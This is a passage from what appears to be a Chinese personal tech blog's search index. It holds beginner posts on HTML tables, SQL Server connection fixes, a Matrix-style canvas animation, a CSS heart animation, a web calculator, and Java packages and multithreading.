-定义列<br>1.table属性<br>a.align=”left/right/center” -控制制整个表格在页面中的水平位置<br>b.bgcolor-整个表格的背景颜色<br>c.border=“n” -控制表格边框宽度<br>d.width -整个表格的宽度<br>e.height -整个表格的高度<br>f.cellpadding-表格内边距<br>g.cellspacing-表格外边距<br>2.tr的属性<br>a.align -控制当前行中内容的水平位置<br>b.bgcolor -控制当前行的背景颜色<br>3.td的属性<br>a-align -控制当前单元格的内容的水平位置<br>b.bgcolor -控制当前单元格的背景颜色<br>c.width -设置当前列的宽度<br>d.colspan -跨列<br>从当前单元格位置向右横向的合并掉几个单元格，并且要把被合并的单元格删掉<br>e.rowspan -跨列<br>从当前单元格位置向下纵向的合并掉几个单元格，并且要把被合并掉的单元格删掉</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装sql时无法连接到local</title>
    <link href="/2018/05/17/%E5%AE%89%E8%A3%85sql%E6%97%B6%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E5%88%B0local/index/"/>
    <url>/2018/05/17/%E5%AE%89%E8%A3%85sql%E6%97%B6%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E5%88%B0local/index/</url>
    
    <content type="html"><![CDATA[<p>1.打开SQL server 配置管理器–&gt;SQL server 网络配置–&gt;实例名的协议</p><p>2.将SQLEXPRESS协议中的Named Pipes和 TCP/IP启用。 <img src="images/watermarktype_ZmFuZ3poZW5naGVpdGkshadow_10text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3ODkwNjM3size_16color_FFFFFFt_70-300x122.jpg"> 3. 点击SQL Server服务，将SQL Server(SQLEXPRESS)重新启动。</p><p>4.重新打开SQL Server Management Studio ,服务器类型选择数据库引擎，服务器名称填（local)\实例名 或者 计算机名\实例名（计算机名为你的计算机名称，实例名一般为SQLEXPRESS或者安装SQL时创建的实例名），身份验证选择windows身份验证。</p><p>5.如果还是连接不上，看看是否计算机名和实例名称有冲突，修改计算机名：桌面–&gt;右击计算机–&gt;属性–&gt;更改设置–&gt;更改<img src="images/20190517235424-watermarktype_ZmFuZ3poZW5naGVpdGkshadow_10text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3ODkwNjM3size_16color_FFFFFFt_70-300x152.jpg"></p><p>补充：运行sql server配置管理器时出现：请求失败或服务未及时响应……….问题时，打开sql server配置管理器，双击【sql server网络配置】将其展开，双击子项【SQLEXPRESS】，在右面的内容窗口中找到【VIA】选项将其设置为禁用就可以了。</p><p>服务里面没有Sql Server 有可能”MSSQLSERVER”没有安装成功，考虑重装下</p><p>打开SQLServer配置管理器时出现“远程过程调用失败0x800706be”时，可能是因为我们在安装VS时，自动安装了“Microsoft SQL Server 2012 Express LocalDB”，所以，我们只需要把它从程序中卸载即可。</p>]]></content>
    
    
    <categories>
      
      <category>运维</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>仿黑客帝国</title>
    <link href="/2018/04/30/%E4%BB%BF%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/index/"/>
    <url>/2018/04/30/%E4%BB%BF%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">”canvas”</span>&gt;</span>请使用高版本浏览器，IE8以及一下不支持canvas<span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">”text/javascript”</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript"><span class="hljs-keyword">var</span> width,height,</span><span class="javascript">canvas = <span class="hljs-built_in">document</span>.getElementById(“canvas”);</span><span class="javascript">canvas.width = width = <span class="hljs-built_in">window</span>.innerWidth || <span class="hljs-built_in">document</span>.documentElement.clientWidth || <span class="hljs-built_in">document</span>.body.clientWidth;</span><span class="javascript">canvas.height = height = <span class="hljs-built_in">window</span>.innerHeight || <span class="hljs-built_in">document</span>.documentElement.clientHeight || <span class="hljs-built_in">document</span>.body.clientHeight;</span><span class="javascript"><span class="hljs-keyword">var</span> ctx = canvas.getContext(‘2d’);</span><span class="javascript"><span class="hljs-keyword">var</span> num = <span class="hljs-built_in">Math</span>.ceil(width / <span class="hljs-number">10</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> y = <span class="hljs-built_in">Array</span>(num).join(<span class="hljs-number">0</span>).split(‘’);</span><span class="javascript"><span class="hljs-keyword">var</span> draw = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">ctx.fillStyle = ‘rgba(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">.05</span>)’; <span class="hljs-comment">//核心代码，创建黑色背景，透明度为0.05的填充色。</span></span>ctx.fillRect(0, 0, width, height);ctx.fillStyle = ‘#0f0’; //设置了字体颜色为绿色<span class="javascript">ctx.font = ‘10px Microsoft YaHei’; <span class="hljs-comment">//设置字体大小与family</span></span>for(i = 0; i &lt; num; i++) &#123;<span class="javascript"><span class="hljs-keyword">var</span> x = (i * <span class="hljs-number">10</span>) + <span class="hljs-number">40</span>;</span><span class="javascript">text = <span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">65</span> + <span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">62</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> y1 = y[i];</span>ctx.fillText(text, x, y1);<span class="javascript"><span class="hljs-keyword">if</span>(y1 &gt; <span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">10</span> * height) &#123;</span>y[i] = 0;<span class="javascript">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="javascript">y[i] = <span class="hljs-built_in">parseInt</span>(y[i]) + <span class="hljs-number">10</span>;</span>&#125;&#125;&#125;<span class="javascript">;(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><span class="javascript"><span class="hljs-built_in">setInterval</span>(draw, <span class="hljs-number">100</span>);</span>&#125;)();&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//复制到txt，后缀名改为html</code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSS实现，一颗剧烈跳动的心</title>
    <link href="/2018/04/29/css%E5%AE%9E%E7%8E%B0%EF%BC%8C%E4%B8%80%E9%A2%97%E5%89%A7%E7%83%88%E8%B7%B3%E5%8A%A8%E7%9A%84%E5%BF%83/index/"/>
    <url>/2018/04/29/css%E5%AE%9E%E7%8E%B0%EF%BC%8C%E4%B8%80%E9%A2%97%E5%89%A7%E7%83%88%E8%B7%B3%E5%8A%A8%E7%9A%84%E5%BF%83/index/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">”utf-8”</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">”text/css”</span>&gt;</span><span class="css"><span class="hljs-selector-tag">div</span>&#123;</span><span class="css"><span class="hljs-attribute">width</span>:<span class="hljs-number">200px</span>;</span><span class="css"><span class="hljs-attribute">height</span>:<span class="hljs-number">200px</span>;</span><span class="css"><span class="hljs-attribute">background-color</span>:red;</span><span class="css"><span class="hljs-attribute">margin</span>:<span class="hljs-number">150px</span> auto;</span>/旋转/<span class="css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);</span><span class="css"><span class="hljs-attribute">filter</span>: <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">30px</span> red);</span><span class="css"><span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.8</span>;</span><span class="css"><span class="hljs-attribute">animation</span>: jump .<span class="hljs-number">1s</span> linear infinite;</span>&#125;<span class="css"><span class="hljs-keyword">@keyframes</span> jump&#123;</span>0%&#123;<span class="css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1</span>)<span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);</span>&#125;70%&#123;<span class="css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">0.8</span>)<span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);</span>&#125;90%&#123;<span class="css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.2</span>)<span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);</span>&#125;100%&#123;<span class="css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1</span>)<span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);</span>&#125;&#125;<span class="css"><span class="hljs-selector-tag">div</span>:before&#123;</span><span class="css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;</span><span class="css"><span class="hljs-attribute">display</span>: block;</span><span class="css"><span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><span class="css"><span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;</span><span class="css"><span class="hljs-attribute">background-color</span>:red;</span><span class="css"><span class="hljs-attribute">position</span>: relative;</span><span class="css"><span class="hljs-attribute">left</span>: -<span class="hljs-number">100px</span>;</span><span class="css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span>&#125;<span class="css"><span class="hljs-selector-tag">div</span>:after&#123;</span><span class="css"><span class="hljs-attribute">content</span>: “”;</span><span class="css"><span class="hljs-attribute">display</span>:block;</span><span class="css"><span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;</span><span class="css"><span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;</span><span class="css"><span class="hljs-attribute">background-color</span>: red;</span><span class="css"><span class="hljs-attribute">position</span>: relative;</span><span class="css"><span class="hljs-attribute">top</span>: -<span class="hljs-number">300px</span>;</span><span class="css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span>&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>//复制到txt文档中，后缀名改为html</code></pre>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个自己写的网页计算器</title>
    <link href="/2017/06/17/%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E7%BD%91%E9%A1%B5%E8%AE%A1%E7%AE%97%E5%99%A8/index/"/>
    <url>/2017/06/17/%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E7%BD%91%E9%A1%B5%E8%AE%A1%E7%AE%97%E5%99%A8/index/</url>
    
    <content type="html"><![CDATA[<style type="text/css">.style1{ width:60px; height:60px; text-align:center; } .style2{ border-style: inset; width: 340px; height:40px; cursor: auto;/\*光标属性\*/ top: 0px; left: 243px; overflow:auto; /\*overflow 属性规定如何处理如何处理不符合元素框的内容。\*/ resize:none; overflow-x:hidden; overflow-y:hidden } .style3{ /\*text-align:"center";\*/ border:1px red solid"; width:300px; height:240px; } .style3 input{ height:59px; width:59px; } .style4{ background-image:url(a.jpg); text-align:center; margin:0 auto; background-color:gray; width:360px; } #Buttonjia{ height:120px; width:59px; }</style> <script> var valueone=""; function Button\_click(valuetwo){ valueone=valueone+valuetwo; document.getElementById("text").value=valueone; return true; } function Calculate(valuethree){ try{ document.getElementById("text").value=valueone+valuethree+eval(document.getElementById("text").value); }catch (excp) {<p>document.getElementById(“text”).innerHTML = “&lt;font color=\“red\“&gt;您输入的表达式有错误，请检查后重新计算！！！！</font>“;</p><p>}</p><p>return true; } function Removeall() { valueone= “”; document.getElementById(“text”).innerHTML = “”; return true; } var oLink = document.createElement(“”); oLink.href = “#”; </script><p></p><div class="style4"> <form> <div align="center"> <textarea class="style2" id="text" name="text01" readonly="readonly" style="font-size:30px;margin:6px auto 2px auto;"></textarea> </div> <table class="style3" align="center"> <tr> <td class="style1"><input id="Button1" type="button" value="1" onclick="return Button\_click('1')"></td> <td class="style1"><input id="Button2" type="button" value="2" onclick="return Button\_click('2')"></td> <td class="style1"><input id="Button3" type="button" value="3" onclick="return Button\_click('3')"></td> <td class="style1"><input id="Button(" type="button" value="(" onclick="return Button\_click('(')"></td> <td class="style1"><input id="Button)" type="button" value=")" onclick="return Button\_click(')')"></td> </tr> <tr> <td class="style1"><input id="Button4" type="button" value="4" onclick="return Button\_click('4')"></td> <td class="style1"><input id="Button5" type="button" value="5" onclick="return Button\_click('5')"></td> <td class="style1"><input id="Button6" type="button" value="6" onclick="return Button\_click('6')"></td> <td class="style1"><input id="Button\*" type="button" value="\*" onclick="return Button\_click('\*')"></td> <td class="style1"><input id="Button/" type="button" value="/" onclick="return Button\_click('/')"></td> </tr> <tr> <td class="style1"><input id="Button7" type="button" value="7" onclick="return Button\_click('7')"></td> <td class="style1"><input id="Button8" type="button" value="8" onclick="return Button\_click('8')"></td> <td class="style1"><input id="Button9" type="button" value="9" onclick="return Button\_click('9')"></td> <td rowspan="2" class="style1"><input id="Buttonjia" type="button" value="+" onclick="return Button\_click('+')"></td> <td class="style1"><input id="Button-" type="button" value="-" onclick="return Button\_click('-')"></td> </tr> <tr> <td class="style1"><input id="reset01" type="reset" value="重置" onclick="return Removeall()"></td> <td class="style1"><input id="Button00" type="button" value="0" onclick="return Button\_click('0')"></td> <td class="style1"><input id="Button." type="button" value="." onclick="return Button\_click('.')"></td> <td class="style1"><input id="Button=" type="button" value="=" onclick="return Calculate('=')"> </td> </tr> </table> </form> </div>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java包及访问控制权限</title>
    <link href="/2017/05/27/java%E5%8C%85%E5%8F%8A%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90/index/"/>
    <url>/2017/05/27/java%E5%8C%85%E5%8F%8A%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90/index/</url>
    
    <content type="html"><![CDATA[<p>概念：package是在使用多个类或接口时为了避免名称重复而采用的一种措施，直接在程序中加入package关键字即可； 定义格式： package 包名称.子包名称； 所谓的包实际上就是一个文件夹，一个*class文件要保存在一个文件夹中。既然包本身就是一个文件夹，所以在java的编译指令中就提供了专门的打包编译命令，在编译的时候加上参数：javac -d.public类名称.java -d表示生成文件夹 *********************************** 导入包： 语法：import 包名称.子包名称.类名称；//导入所需要的类 import 包名称.子包名称.*； 两种导入方式性能一样，但是在导入包是要注意要是导入了不同包的同名类时则可能出现不明确的错误信息。如果出现这种情况，则最好写入完整的“包.类名称” 若一个类只在本包访问，则直接声明成class即可，而如果一个类需要被外包访问，则必须声明为public class。 包可以将很多的class文件分类保存好，可以避免多人开发时类文件重名的情况。</p><p>Java的访问权限： private：同一类 default：同一类，同一包的类 protected：同一类，同一包的类，不同包的子类 /****子类是作为另一个类的扩充或修正所定义的一个类.****/ pubic：同一类，同一包的类，不同包的子类，其他包的类 Java命名规范： 类：首字母大写 方法： 属性第一个单词首字母小写，之后的每个单词的首字母大写 包：所有单词字母小写 常量：所有单词首字母大写</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Java多线程</title>
    <link href="/2017/05/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/index/"/>
    <url>/2017/05/26/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/index/</url>
    
    <content type="html"><![CDATA[<p>进程：程序的一次动态执行过程，它经历了从代码加载，执行到执行完毕的一个完整过程，这个过程也是进程本身从产生，发展到最终消亡的过程。 多线程是实现并发机制的一直有效手段。进程和线程一样，都是实现并发的一个基本单位。</p><p><strong>Java实现多线程方式</strong>：</p><p>1.继承Thread 2.实现Runnable接口 Thread类：在java.lang包中定义的，一个类只要继承了Thread类，此类就称为多线程操作类。在Thread子类中，必须明确的覆写Thread类中的run（）方法，此方法为线程的主体。 多线程定义语法： class 类名称 extends Thread{ 属性…； 方法…； public void run（）{ 线程主体； } } 实现Runnable接口比继承Thread类有如下的明显优点 1.适合多个相同程序代码的线程去处理同一个资源 2.可以避免由于单继承局限带来的影响 3.增加了程序的健壮性，代码能够被多个线程共享，代码与数据是独立的 综合类看，开发中使用Runnable接口是最合适的，以后使用多线程时都以Runnable接口的实现为操作的重点 线程的状态： 1.创建状态：准备好了一个多线程的对象：Thread t=new Thread（） 2.就绪状态：调用start方法，等待cpu进行调度 3.运行状态：执行run（）方法 阻塞状态：暂时停止执行，可能将资源交给其他线程使用。 终止状态（死亡状态）：线程执行完毕，不再使用了。 Thread类中，通过getName（）方法取得线程名称，通过setName（）方法设置线程名称。 线程名称一般在启动前设置但也允许为已经运行的线程设置名称。允许两个Thread对象有相同的名字，但为了清晰，尽量避免此情况。 如果程序没有为线程指定名称，则系统会自动的为线程分配一个名称。 可以用currentThread（）方法来取得当前正在运行的线程。 主方法实际上也是一个线程，主线程。 Java本身具备了垃圾回收机制，所以每当java程序执行的时候都会启动至少两个线程：主线程，GC（垃圾回收线程）。 可以通过isAlive方法来判断线程是否执行。 在线程操作中，可以使用join（）方法让一个线程强制运行，线程强制运行期间，其他线程无法运行，必须等待此线程完成之后才可以继续执行。 可以使用Thread.sleep（）方法来使的线程暂时的休眠。 一个线程可以被另一个线程中断其操作的状态，使用interrupt（）方法完成。 线程优先级：通过setPriority（）函数设置，共三种：MIN_PRIORITY,NORM_PRIORITY,MAX_PRIORITY。 用yield（）函数来实现线程礼让。</p><p><strong>线程同步与死锁</strong></p><p>同步：即多个操作在同一时间段内只能有一个线程进行，其他线程要等待此线程完成后才可以继续执行。 使用同步代码块，格式： synchronized（同步对象）{ 需要同步的代码 } 使用同步操作后，程序的执行效率会明显降低很多。 或者可以使用同步方法，格式： synchronized 方法返回值 方法名称（参数列表）{</p><p>} 资源共享时需要进行共享操作，但是程序中过多的同步会产生死锁。 死锁一般情况下就是表示在互相等待，是在程序运行时出现的一种问题。</p><p><strong>线程的声明周期</strong></p><p>一个新的线程创建之后可以通过start（）方法进入到运行状态，在运行状态中可以使用yield（）进行礼让，但是仍然可以进行，如果现在一个线程需要暂停的话，可以使用suspend（），sleep（），wait（），如果现在线程不需要执行，则可以通过stop（）结束（如果run（）方法执行完毕也表示结束），或者一个新的线程直接调用stop（）方法也可以进行结束。 suspend（）：暂时挂起线程。 resume（）：恢复挂起的线程。 stop（）:停止线程。 因为以上的三个方法都会产生死锁的问题，所以现在不建议使用。 如果想要停止一个线程运行的话，可以通过设置标志位，让线程停止运行。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
